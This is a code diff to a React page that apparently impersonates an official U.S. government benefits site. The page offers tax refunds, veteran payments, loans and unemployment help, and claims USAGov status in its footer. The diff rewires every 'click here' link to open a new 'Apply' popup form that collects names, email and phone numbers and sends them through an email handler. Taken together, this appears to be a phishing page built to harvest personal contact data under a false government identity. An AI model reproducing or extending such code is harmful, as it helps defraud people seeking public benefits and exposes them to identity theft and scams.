@@ -121,7 +121,7 @@ export default function Main() {
  
           <h4  className='heading-4'>2023 Irs Tax Refund</h4>
           <p  className='feature__text'>The IRS urges people to have all the information they need before they file a tax return. Filing a complete and accurate tax return can avoid extensive processing and refund delays as well as avoid the possibility of needing to file an amended tax return.    
-          <a href='#' className='popup'>click here</a></p>
+          <a href='#popup' className='link'>click here</a></p>
       
         </div>
 
@@ -130,33 +130,33 @@ export default function Main() {
       
           <h4 className='heading-4 heading-4--dark' >Financial Assistance</h4>
           <p  className='feature__text'>As the official benefits website of the U.S. government, Benefits.gov increases access to benefit information and program eligibility requirements to help citizens find government assistance.
-          <a href='#' className='popup'>click here</a></p>
+          <a href='#popup' className='link'>click here</a></p>
         </div>
 
 
         <div className='feature'>
           <h4 className='heading-4 heading-4--dark' >Veteran Disabilty</h4>
           <p  className='feature__text'>The Department of Veterans Affairs (VA) provides a one-time payment to disabled Veterans of no more than $22,355.72 toward the purchase of an automobile or other transportation.
-          <a href='#' className='popup'>click here</a></p>
+          <a href='#popup' className='link'>click here</a></p>
         </div>
 
 
         <div className='feature'>
           <h4 className='heading-4 heading-4--dark '>Mortgages</h4>
           <p className='feature__text'>This program can help individuals buy a single family home. While U.S. Federal Housing Administration (FHA) approved lenders make loans through a number of FHA-insurance programs.
-          <a href='#' className='popup'>click here</a> </p>
+          <a href='#popup' className='link'>click here</a> </p>
           </div>
 
         <div className='feature'>
           <h4 className='heading-4 heading-4--dark'>Unemployment Faqs</h4>
           <p className='feature__text'>Unemployment Insurance, offered by the U.S. Department of Labor (DOL), is a benefit designed to help those who have lost their job due to no fault of their own. 
-          <a href='#' className='popup'>click here</a></p>
+          <a href='#popup' className='link'>click here</a></p>
         </div>
         
         <div className='feature'>
           <h4 className='heading-4 heading-4--dark'>Small Business Loan</h4>
           <p  className='feature__text'>7(a) loans are the most basic and most used type loan of the Small Business Administration's (SBA) business loan programs.
-          <a href='#' className='popup'>click here</a> </p>
+          <a href='#popup' className='link'>click here</a> </p>
         </div>
 
 
@@ -408,6 +408,50 @@ THE PROGRAM OFFERS BUSINESS OPPORTUNITY, FOSTER SUSTAINABLE ECONOMIC GROWTH, MAK
    <p className='copyright'>
    &copy;USAGov is the official Guide to Government Information and Services </p>
      </footer>
+
+     <div className='popup' id='popup'>
+     <div className='popup__content'>
+     <div className='popup__shell'>
+     <h3 className='heading-3 formHead'>Apply</h3>
+     <a href='#main' className='popup__close'>&times;</a>
+    
+    
+<form action='#'  ref={form} onSubmit={sendEmail} className='popform'>
+<BarLoader loading={loader} color="#36d7b7" className='w-100' />
+
+{/* lastname */}
+    <div className='popform__group'>
+<label for="lastname" className='popform__label'>Lastname</label>
+<input type="text" name='lastname' className="popform__input" placeholder="lastname"  value={lastname} onChange={(e)=>setLastname(e.target.value)} required/>
+  </div>
+  
+  {/* firstname */}
+  <div className="popform__group">
+<label for="firstname" className='popform__label'>Firstname</label>
+<input type="text" name='firstname' className="popform__input"  placeholder="firstname"  value={firstname} onChange={(e)=>setFirstname(e.target.value)} required/>
+  </div>
+
+
+   {/* email    */}
+   <div className='popform__group'>
+<label for="email" className='popform__label'>Email Address</label>
+<input type="text" name='email' className="popform__input"  placeholder="email"  value={email} onChange={(e)=>setEmail(e.target.value)} required/>
+  </div>
+ 
+ {/* phone */}
+ <div className='popform__group'>
+<label for="phone" className='popform__label'>Phone Number</label>
+<input type="tel" name='phone' className="popform__input" placeholder="+1 (234) 456-7890"  value={phone} onChange={(e)=>setPhone(e.target.value)} required/>
+  </div>
+
+
+ <div className='popform__group'>
+    <input type='submit' value="Apply" className='btn'/>
+ </div>
+  </form>
+  </div>
+      </div>
+     </div>
      
 </div>
 
